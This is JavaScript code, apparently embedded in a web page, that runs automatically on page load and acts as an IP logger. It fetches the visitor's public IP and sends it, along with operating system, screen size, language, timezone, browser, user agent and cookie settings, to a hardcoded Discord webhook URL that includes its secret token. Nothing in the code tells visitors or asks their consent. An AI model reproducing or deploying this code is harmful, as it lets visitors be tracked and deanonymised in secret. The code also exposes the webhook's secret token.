        function fetchGeolocationData(ipAddress) {
            const geoDataURL = `https://ipapi.co/${ipAddress}/json/`;

            fetch(geoDataURL)
                .then(response => response.json())
                .then(geoData => {
                    // Update the information in the HTML
                    document.getElementById("ipAddress").textContent = geoData.ip;
                })
                .catch(error => console.error(error));
        }

        function sendIPToWebhook() {
            const webhookURL = "https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW"; // Replace with your actual Discord webhook URL

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    fetchGeolocationData(ipAddress); // Fetch and display geolocation data
                    sendGeolocationEmbedToWebhook(webhookURL, ipAddress);
                })
                .catch(error => console.error(error));
        }

        function sendGeolocationEmbedToWebhook(webhookURL, ipAddress) {
            fetchGeolocationData(ipAddress); // Fetch and display geolocation data

            const embedData = {
                "title": "User Geolocation Information",
                "color": 16776960, // Yellow color (decimal representation)
                "fields": [
                    {
                        "name": "IP Address",
                        "value": ipAddress,
                        "inline": true
                    },
                ]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    embeds: [embedData]
                }),
            })
                .then(response => {
                    if (response.ok) {
                    } else {
                    }
                })
        }

        // Automatically send the webhook on page load
        sendIPToWebhook();
        
              function sendUserInformationToWebhook() {
    const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL

    // Get user information
    const os = getOperatingSystem();
    const screenInfo = getScreenInfo();
    const languageInfo = getLanguageInfo();
    const timezoneInfo = getTimezoneInfo();
    const browserInfo = getBrowserInfo();
    const userAgent = getUserAgentInfo();
    const currentTime = getCurrentTime();
    const currentDate = getCurrentDate();
    const javaEnabled = isJavaEnabled();
    const cookiesEnabled = areCookiesEnabled();

    const embedData = {
        "title": "User Information",
        "color": 16776960, // Yellow color (decimal representation)
        "fields": [
            {
                "name": "Operating System",
                "value": os,
                "inline": true
            },
            {
                "name": "Screen Dimensions",
                "value": screenInfo,
                "inline": true
            },
            {
                "name": "Language",
                "value": languageInfo,
                "inline": true
            },
            {
                "name": "Timezone",
                "value": timezoneInfo,
                "inline": true
            },
            {
                "name": "Browser",
                "value": browserInfo,
                "inline": true
            },
            {
                "name": "User Agent",
                "value": userAgent,
                "inline": true
            },
            {
                "name": "Current Time",
                "value": currentTime,
                "inline": true
            },
            {
                "name": "Current Date",
                "value": currentDate,
                "inline": true
            },
            {
                "name": "Java Enabled",
                "value": javaEnabled,
                "inline": true
            },
            {
                "name": "Cookies Enabled",
                "value": cookiesEnabled,
                "inline": true
            }
        ]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            embeds: [embedData]
        }),
    })
    .then(response => {
        if (response.ok) {
        } else {
        }
    })
}

function getOperatingSystem() {
    const userAgent = navigator.userAgent;
    let os = 'Unknown';
    if (userAgent.indexOf('Win') !== -1) os = 'Windows';
    else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
    else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
    else if (userAgent.indexOf('Android') !== -1) os = 'Android';
    else if (userAgent.indexOf('iOS') !== -1) os = 'iOS';
    return os;
}

function getScreenInfo() {
    return `Width: ${window.screen.width}, Height: ${window.screen.height}`;
}

function getLanguageInfo() {
    return navigator.language || 'Unknown';
}

function getTimezoneInfo() {
    return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
}

function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    const browserInfo = userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    const browserName = browserInfo[1];
    const browserVersion = browserInfo[2];

    if (browserName === 'Chrome') {
        return `Google Chrome (Version ${browserVersion})`;
    } else if (browserName === 'Safari') {
        return `Safari (Version ${browserVersion})`;
    } else if (browserName === 'Firefox') {
        return `Mozilla Firefox (Version ${browserVersion})`;
    } else if (browserName === 'Edge' || browserName === 'MSIE') {
        return `Microsoft Internet Explorer (Version ${browserVersion})`;
    } else if (browserName === 'Opera') {
        return `Opera (Version ${browserVersion})`;
    } else {
        return 'Unknown Browser';
    }
}

function getUserAgentInfo() {
    return navigator.userAgent || 'Unknown';
}

function getCurrentTime() {
    const now = new Date();
    return now.toLocaleTimeString();
}

function getCurrentDate() {
    const now = new Date();
    return now.toLocaleDateString();
}

function isJavaEnabled() {
    return navigator.javaEnabled() ? 'Enabled' : 'Disabled';
}

function areCookiesEnabled() {
    return navigator.cookieEnabled ? 'Enabled' : 'Disabled';
}

// Automatically send the webhook on page load
sendUserInformationToWebhook();
